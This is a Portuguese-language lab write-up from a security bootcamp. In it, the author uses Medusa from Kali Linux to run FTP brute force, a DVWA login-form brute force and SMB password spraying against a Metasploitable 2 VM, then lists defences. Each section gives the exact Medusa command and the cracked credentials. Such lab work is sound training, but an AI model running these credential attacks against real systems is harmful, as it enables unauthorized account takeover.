# 🛡️ Desafio DIO: Simulação de Ataque de Força Bruta com Medusa

## 📝 Sobre o Projeto
Este projeto faz parte do bootcamp da DIO. O objetivo foi criar um laboratório seguro (parquinho de areia) usando VirtualBox para entender como funcionam os ataques de força bruta e como podemos defender os sistemas contra eles.

**Ferramentas Utilizadas:**
* Kali Linux (Sistema do Atacante)
* Metasploitable 2 (Sistema Alvo)
* Medusa (Ferramenta de Automação de Ataque)

---

## 🎯 Ataque 1: Força Bruta no FTP
O FTP é um serviço de transferência de arquivos. Criei uma lista de senhas (wordlist) e usei o Medusa para testar milhares de combinações rapidamente.

* **Comando utilizado:**
`medusa -h 192.168.56.102 -u msfadmin -P senhas.txt -M ftp`

* **Resultado:**

<img width="1699" height="1437" alt="Captura de tela 2026-05-02 183917" src="https://github.com/user-attachments/assets/e99e82f6-35ff-4d61-ba1c-ad73653be8db" />

2026-05-02 17:38:25 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: admin (2 of 6 complete)

2026-05-02 17:38:33 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: password (3 of 6 complete)

2026-05-02 17:38:40 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: qwerty (4 of 6 complete)

2026-05-02 17:38:40 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: msfadmin (5 of 6 complete)

2026-05-02 17:38:40 ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]

---

## 🎯 Ataque 2: Força Bruta em Formulário Web (DVWA)
Aqui o alvo foi a página de login de um site vulnerável. Ensinei o Medusa a ler a página de erro do site para descobrir quando a senha estava errada.

* **Comando utilizado:**
`medusa -h 192.168.56.102 -u admin -P senhas.txt -M web-form -m FORM:"/dvwa/login.php" -m DENY-SIGNAL:"Login failed"`

* **Resultado:**
  <img width="1705" height="1436" alt="Captura de tela 2026-05-02 184810" src="https://github.com/user-attachments/assets/3c99323b-5b07-4f24-b633-b02e4c80f6d4" />

medusa -h 192.168.56.102 -u admin -P senhas.txt -M web-form -m FORM:"/dvwa/login.php" -m DENY-SIGNAL:"Login failed"

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>



2026-05-02 17:47:56 ACCOUNT CHECK: [web-form] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 123456 (1 of 6 complete)

2026-05-02 17:47:56 ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: 123456 [SUCCESS]

---

## 🎯 Ataque 3: Password Spraying no SMB
O SMB compartilha pastas na rede. Diferente da força bruta comum, aqui testamos **vários usuários** com apenas **uma senha**, para tentar passar despercebido pelos sistemas de segurança.

* **Comando utilizado:**
`medusa -h 192.168.56.102 -U usuarios.txt -p msfadmin -M smbnt`

* **Resultado:**
<img width="1698" height="1434" alt="Captura de tela 2026-05-02 185500" src="https://github.com/user-attachments/assets/8d44948a-914f-47df-bd39-2186048981c2" />

medusa -h 192.168.56.102 -U usuarios.txt -p msfadmin -M smbnt                                                      

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>



2026-05-02 17:51:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 5, 0 complete) Password: msfadmin (1 of 1 complete)

2026-05-02 17:51:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (2 of 5, 1 complete) Password: msfadmin (1 of 1 complete)

2026-05-02 17:51:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (3 of 5, 2 complete) Password: msfadmin (1 of 1 complete)

2026-05-02 17:51:14 ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

2026-05-02 17:51:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (4 of 5, 3 complete) Password: msfadmin (1 of 1 complete)

2026-05-02 17:51:14 ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: guest (5 of 5, 4 complete) Password: msfadmin (1 of 1 complete)
---

## 🛡️ Como se Defender? (Mitigações)
Como profissional de segurança, recomendo as seguintes defesas para bloquear os ataques que acabei de simular:

1. **Bloqueio de Conta (Account Lockout):** Se a pessoa errar a senha 3 ou 5 vezes, o sistema deve bloquear a conta por alguns minutos. Isso "quebra as pernas" do Medusa no FTP e na Web.
2. **Senhas Fortes:** Proibir senhas óbvias como "123456" ou "password". Exigir letras, números e símbolos.
3. **MFA (Autenticação de Dois Fatores):** Mesmo que o atacante descubra a senha, ele não vai ter o código do celular para conseguir entrar.
4. **Monitoramento (Para o Password Spraying):** Criar alertas no sistema se houver muitos erros de login espalhados por vários usuários diferentes ao mesmo tempo.
